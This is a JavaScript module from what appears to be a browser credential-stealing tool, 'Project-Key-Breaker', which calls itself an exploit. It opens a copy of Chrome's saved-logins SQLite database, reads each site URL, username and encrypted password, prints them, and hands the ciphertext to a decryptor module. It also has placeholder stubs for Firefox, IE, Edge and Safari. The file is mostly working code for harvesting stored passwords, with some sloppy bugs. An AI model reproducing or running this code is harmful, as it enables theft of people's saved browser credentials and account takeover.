const s = require('sqlite3').verbose(),
	pwnd = require("./decryptor"),
	Check = require("./sys_check"),
	{ args } = require("../app"),
	{ copySync } = require("fs-extra");
let x, y;

console.log(args);
switch (process.platform) {
	case "win32": y = "win32"; break;
	case "darwin": y = "darwin"; break;
	case "linux": y = "linux"; break;
} switch (args) {
	case "chrome": x = "chrome"; break;
	case "firefox": x= "firefox"; break;
	case "safari": x = "safari"; break;
	case "opera": x = "opera"; break;
	case "edge": x = "edge" ; break;
	case "ie": x = "ie"; break;
	default: x = "chrome"; break;
} switch (y) {
	case "win32": y = Check.win32(x); break;
	case "darwin": y = Check.macos(x); break;
	case "linux": y = Check.linux(x); break;
}

const chrome = (async () => {
			try {
				//console.log(process.env.LANG);
				if (!process.env.LANG === "en_US.UTF-8" || !process.env.LANG === "en_AU.UTF-8") console.log("Sorry to inform you, but the system language isn't compatible with the exploit as of yet!\n\nKeep an eye out for future updates about this at: https://key-break.er/updates or https://github.com/KazutoKashima/Project-Key-Breaker/"), process.exit(1);
				/*copySync(y, "./Loginvault.db");
				require("fs").writeFileSync("./Loginvault.db", y)*/
				let db = await new s.Database("./Loginvault.db", (e) => {
					if (e) return console.error(e);
					return console.log('Connected to Database');
				});

				
				db.serialize(async () => {
					db.each(
						"SELECT action_url, username_value, password_value FROM logins",
						async (e, row) => {
							if (e) return console.error(e);
							console.log(`URL: ${row.action_url}`),
							console.log(`Username: ${row.username}`),
							console.log('Password Cipher: ' + row.password_value),

							//console.time(),
							// run func to decrypt.
							enc = row.password_value,
							enc = await pwnd.fndEnc(enc),
							console.log("encypted stuffs:", enc),
							await pwnd.decrypt(row.password_value);
						}
					);
				});
			} catch (e) {
				return console.error(e);
			}
	}),
	firefox = (async () => {
		return console.log("Firefox expoit not ready yet!");
	}),
	ie = (async () => {
		return console.log("IE expoit not ready yet!");
	}),
	edge = (async () => {
		return console.log("Edge expoit not ready yet!");
	}),
	safari = (async () => {
		return console.log("Safari expoit not ready yet!");
	});

module.exports = {
	chrome: chrome,
	firefox: firefox,
	ie: ie,
	edge: edge,
	safari: safari
};